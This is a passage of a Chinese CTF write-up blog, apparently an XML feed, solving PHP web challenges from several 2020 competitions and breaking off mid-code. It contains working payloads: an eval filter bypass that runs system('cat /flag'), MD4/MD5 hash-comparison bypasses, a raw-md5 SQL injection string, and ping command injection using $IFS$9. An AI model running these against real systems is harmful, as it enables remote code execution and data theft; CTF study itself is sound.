class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>既然是赛后复现，那肯定是看了wp的</p><p>这里可以利用被过滤的字母数字存放的数组来进行构造</p><p>此外，数组肯定是要有下标的，然后利用递增取到想要的内容，这里用的是<code>(&quot;!=&quot;!=&quot;==&quot;)</code>，这显示为真，php中打印的结果为1，之后通过累加就能拿到不同的数字了，直接上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">list</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'~'</span>,<span class="string">'^'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'&amp;'</span>,<span class="string">'?'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">long = len(<span class="keyword">list</span>)</span><br><span class="line">str1 = <span class="string">'system'</span></span><br><span class="line">str2 = <span class="string">'cat /flag'</span></span><br><span class="line">strings=<span class="string">''</span></span><br><span class="line">strings += <span class="string">"$__="</span></span><br><span class="line"><span class="keyword">for</span> j in str1:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    </span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">');'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">"$___="</span></span><br><span class="line"><span class="keyword">for</span> j in str2:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    <span class="comment"># print(strings)</span></span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">'$__($___);//'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(strings)</span><br></pre></td></tr></table></figure><p>还是很好懂的，这里就不解释了，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;);$___&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.&quot; &quot;.&quot;&#x2F;&quot;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;;$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/7.png" class=""><p>通过这道题提供了新思路，之后碰到类似的也可以尝试类似的方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> DAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯</title>
      <link href="/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
      <url>/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>强网先锋的web还好，单独分类的web太难了，是自己太菜了…</p><h1 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h1><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>md4碰撞</li><li>MD5绕过</li><li>sql注入中的md5</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LEVEL1</p><p>找文章<a href="https://crdx.org/post/hsctf-2019-md5-minus-minus" target="_blank" rel="noopener">https://crdx.org/post/hsctf-2019-md5-minus-minus</a></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((++$c % <span class="number">1000000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">"."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n = <span class="string">"0e"</span> . $i++;</span><br><span class="line">    $h = hash(<span class="string">'md4'</span>, $n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n == $h) &#123;</span><br><span class="line">        printf(<span class="string">"\nFound: $n\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#Found: 0e251288019</span></span><br></pre></td></tr></table></figure><p>LEVEL2</p><p>这一步很简单数组绕过即可</p><p>LEVEL3</p><p>要让<code>&quot;.md5($pass,true).&quot;</code>为true</p><p>这篇文章叙述详细<a href="https://www.pianshen.com/article/789754585/" target="_blank" rel="noopener">https://www.pianshen.com/article/789754585/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#content: ffifdyop</span></span><br><span class="line"><span class="comment">#hex: 276f722736c95d99e921722cf9ed621c</span></span><br><span class="line"><span class="comment">#raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span></span><br><span class="line"><span class="comment">#string: 'or'6]!r,b</span></span><br></pre></td></tr></table></figure><p>最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><img src="/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/1.png" class=""><h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>绕过flag过滤</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>看一下当前目录文件，flag.php和index.php</p><p>用之前遇到过的题目的payload即可，$IFS$9绕过空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>环境关了，就挂不了出flag的图了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼城杯</title>
      <link href="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/"/>
      <url>/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>web pwn太顶了orz，不会，还有一题根本没思路…</p><p>只能说这有奖金的比赛py很严重，最后1分钟团队狂掉名次…</p><p>自己太菜了，没啥输出，拖后腿了…</p><h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a><strong>easyseed</strong></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>mt_rand</li><li>php_mt_rand爆破种子</li><li>XFF</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开始一个弹窗，提示不是主人，开始没在意，后面吃大亏…</p><p>index.bak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*************************</span><br><span class="line">$lock &#x3D; random(6, &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line">$key &#x3D; random(16, 